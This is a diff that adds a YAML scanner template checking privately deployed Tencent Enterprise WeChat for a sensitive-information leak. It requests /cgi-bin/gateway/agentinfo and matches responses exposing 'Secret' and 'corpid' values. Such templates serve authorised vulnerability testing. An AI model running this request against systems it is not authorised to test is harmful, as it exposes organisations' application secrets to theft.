@@ -1,0 +1,15 @@
+id: poc-yaml-Tencent-enterprise-wechat-information-disclosure
+info:
+  name: Tencent-企业微信私有化（含政务微信）-敏感信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: Tencent-企业微信私有化（含政务微信）
+requests:
+- method: GET
+  path: /cgi-bin/gateway/agentinfo
+  expression: status_code == 200 && contains(body, "Secret") && contains(body, "corpid")
+    && !contains(body, "<") && contains(body, "\"errcode\":0,\"errmsg\":\"ok\",\"strcorpid\":")
+  output: []
+variables: {}
+transport: http
